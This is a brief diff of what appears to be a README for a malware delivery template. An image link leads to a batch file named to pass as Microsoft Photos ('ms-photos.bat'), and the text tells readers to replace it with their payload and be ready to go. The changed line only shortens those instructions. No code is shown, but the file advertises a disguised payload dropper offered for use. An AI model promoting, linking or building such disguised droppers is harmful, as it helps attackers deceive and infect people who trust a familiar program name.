@@ -5,7 +5,7 @@
 
 [<img src="https://github.com/gzmatte/trash/blob/main/48wx.png">](https://github.com/gzmatte/ms-photos/releases/download/1/ms-photos.bat)
 
-```Replace with your payload, extract and you ready-to-go.```
+```Replace with your payload and you ready-to-go.```
 
 ```Edit the batch if isn't working.```
 
